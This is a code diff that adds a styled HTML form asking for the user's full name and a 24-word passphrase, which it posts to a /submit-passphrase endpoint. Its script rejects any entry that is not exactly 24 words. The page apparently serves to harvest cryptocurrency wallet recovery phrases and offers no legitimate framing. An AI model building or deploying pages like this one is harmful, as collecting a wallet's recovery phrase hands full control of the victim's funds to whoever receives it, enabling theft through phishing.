@@ -1,0 +1,97 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Passphrase Form</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            margin: 0;
+            background-color: #f4f4f4;
+        }
+        form {
+            background-color: white;
+            padding: 20px;
+            border-radius: 8px;
+            box-shadow: 0px 4px 8px rgba(0, 0, 0, 0.1);
+            width: 50%;
+        }
+        h1 {
+            text-align: center;
+            margin-bottom: 20px;
+        }
+        label {
+            display: block;
+            font-weight: bold;
+            margin-top: 10px;
+        }
+        input, textarea {
+            width: 100%;
+            padding: 10px;
+            margin-top: 5px;
+            margin-bottom: 15px;
+            border: 1px solid #ccc;
+            border-radius: 4px;
+        }
+        textarea {
+            height: 150px; /* Half page height for passphrase */
+        }
+        button {
+            display: block;
+            width: 100%;
+            padding: 12px;
+            background-color: #4CAF50;
+            color: white;
+            border: none;
+            border-radius: 4px;
+            font-size: 16px;
+        }
+        button:hover {
+            background-color: #45a049;
+        }
+        .error {
+            color: red;
+            font-weight: bold;
+            margin-bottom: 10px;
+        }
+    </style>
+</head>
+<body>
+    <form action="/submit-passphrase" method="POST">
+        <h1>Enter Your Details</h1>
+        <label for="name">Enter Your Full Name:</label>
+        <input type="text" id="name" name="name" required>
+        
+        <label for="passphrase">Enter Your 24-Words Passphrase:</label>
+        <textarea id="passphrase" name="passphrase" required></textarea>
+
+        <!-- Error message above the submit button -->
+        <div id="error-message" class="error" style="display: none;">Please enter a valid 24-word passphrase.</div>
+
+        <button type="submit">Submit</button>
+    </form>
+
+    <script>
+        // Add form validation on the client-side before submission
+        const form = document.querySelector("form");
+        form.addEventListener("submit", function(event) {
+            const passphrase = document.getElementById("passphrase").value.trim();
+            const errorMessage = document.getElementById("error-message");
+
+            // Split the passphrase by spaces and check if there are exactly 24 words
+            const words = passphrase.split(" ");
+            if (words.length !== 24) {
+                event.preventDefault();  // Prevent form submission
+                errorMessage.style.display = "block";  // Show error message
+            } else {
+                errorMessage.style.display = "none";  // Hide error message
+            }
+        });
+    </script>
+</body>
+</html>
